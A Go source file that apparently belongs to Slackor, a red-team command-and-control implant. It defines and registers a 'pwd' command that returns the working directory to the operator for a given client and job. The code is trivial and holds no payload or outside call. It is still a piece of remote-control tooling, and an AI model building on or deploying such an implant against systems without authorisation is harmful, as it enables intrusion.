package common

import (
	"os"

	"github.com/Coalfire-Research/Slackor/pkg/command"
)

// PWD gets the current working directory
type PWD struct{}

// Name is the name of the command
func (p PWD) Name() string {
	return "pwd"
}

// Run gets the current working directory
func (p PWD) Run(clientID string, jobID string, args []string) (string, error) {
	return os.Getwd()
}

func init() {
	command.RegisterCommand(PWD{})
}
